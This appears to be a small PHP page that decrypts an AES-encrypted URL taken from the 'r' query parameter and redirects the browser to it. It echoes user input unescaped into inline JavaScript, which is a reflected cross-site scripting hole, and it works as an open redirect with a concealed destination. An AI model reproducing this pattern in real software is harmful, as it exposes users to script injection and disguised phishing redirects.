<?php
    $redirect = $_GET['r'];
?>
<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.0.0/crypto-js.min.js"></script>
<script>
    key = '<?php echo substr($redirect,0,32);?>';
    length = '<?php echo substr($redirect,32,3);?>';
    message = '<?php echo str_replace(" ", "+", substr($redirect,35));?>';
    decrypted = CryptoJS.AES.decrypt(message,key);
    url = decrypted.toString(CryptoJS.enc.Utf8).substr(0,parseInt('0x'+length));
    window.location.href = url;
</script>
